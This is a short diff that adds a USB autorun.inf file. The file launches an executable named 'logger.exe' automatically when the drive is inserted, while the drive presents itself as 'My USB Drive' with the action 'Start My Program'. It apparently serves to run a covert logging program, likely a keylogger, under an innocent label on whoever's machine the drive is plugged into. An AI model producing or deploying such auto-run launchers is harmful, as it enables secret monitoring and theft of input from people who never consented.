@@ -1,0 +1,5 @@
+[Autorun]
+Open=logger.exe
+Action=Start My Program
+Label=My USB Drive
+Icon=logger.exe
